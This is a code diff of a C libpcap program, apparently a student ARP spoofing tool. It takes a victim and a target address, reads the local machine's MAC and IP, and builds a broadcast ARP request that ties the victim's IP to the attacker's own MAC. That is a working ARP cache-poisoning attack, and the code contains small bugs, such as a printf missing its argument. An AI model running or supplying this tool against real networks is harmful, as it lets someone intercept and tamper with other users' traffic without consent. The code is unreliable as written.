@@ -1,6 +1,13 @@
+#include <arpa/inet.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <stdint.h>
 #include <pcap/pcap.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <netinet/if_ether.h>
 
 typedef struct etherhdr{
   char dstMac[6];
@@ -8,7 +15,7 @@ typedef struct etherhdr{
   char etherType[2];
 } ETHERHDR;
 
-typedef struct arphdr{
+typedef struct arphdr_jtj{
   ETHERHDR eh;
   u_char ht[2];
   u_char pt[2];
@@ -32,7 +39,17 @@ void main(int argc, char **argv)
     struct pcap_pkthdr header;		/* The header that pcap gives us */
     u_char packet[100];			/* The actual packet */
 
-    
+    char* victim;
+    char* target;
+
+    if(argc != 4)   {
+        printf("\n\nUsage : %s [network] [victim] [target]\n\n");
+        return 2;
+    }
+
+
+    struct in_addr iaddr;
+
     dev = argv[1];
 
   /* Error 제어 { */
@@ -42,11 +59,26 @@ void main(int argc, char **argv)
     if (handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf); return(2); }
   /*}*/
 
+
+    int fd;
+    struct ifreq ifr;
+    struct ether_header *ETH;
+    struct ether_arp arph;
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+    ifr.ifr_addr.sa_family = AF_INET;
+    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
+    ioctl(fd, SIOCGIFADDR, &ifr);  //ip address
+    struct in_addr my_ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
+    ioctl(fd, SIOCGIFHWADDR, &ifr); //mac address
+    u_int8_t my_mac[ETH_ALEN];
+    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
+    close(fd);
+
     ARPHDR sendHdr;
 
     // u_char dstMac[7] = "\x00\x50\x56\xc0\x00\x08";
-    u_char srcMac[7] = "\xf4\x8c\x50\x8c\xda\xc0";
-    u_char dstMac[7] = "\xe4\x42\xa6\xa1\xfb\x08";
+    u_char *srcMac = my_mac;
+    u_char dstMac[7] = "\xff\xff\xff\xff\xff\xff";
 
     memcpy(sendHdr.eh.dstMac, dstMac, 6);
     memcpy(sendHdr.eh.srcMac, srcMac, 6);
@@ -56,12 +88,17 @@ void main(int argc, char **argv)
     memcpy(sendHdr.pt, "\x08\x00", 2);
     memcpy(sendHdr.hal, "\x06", 1);
     memcpy(sendHdr.pal, "\x04", 1);
-    memcpy(sendHdr.op, "\x00\x02", 2);
+    memcpy(sendHdr.op, "\x00\x01", 2); // OPCODE
 
     memcpy(sendHdr.sha, srcMac, 6);
-    memcpy(sendHdr.spa, "\xc0\xa8\x20\xfe", 4); //C0A8EE82
-    memcpy(sendHdr.dha, dstMac, 6);
-    memcpy(sendHdr.dpa, "\xc0\xa8\x20\x01", 4);
+
+    inet_pton(AF_INET, argv[2], &iaddr.s_addr);
+    memcpy(sendHdr.spa, &iaddr.s_addr, 4); //C0A8EE82 // "\xc0\xa8\x20\xfe"
+
+    memcpy(sendHdr.dha, "\x00\x00\x00\x00\x00\x00", 6);
+
+    inet_pton(AF_INET, argv[3], &iaddr.s_addr);
+    memcpy(sendHdr.dpa, &iaddr.s_addr, 4); // "\xc0\xa8\x20\x01"
 
     memset(packet, 0x00, 100);
     memcpy(packet, (void *)&sendHdr, sizeof(sendHdr));
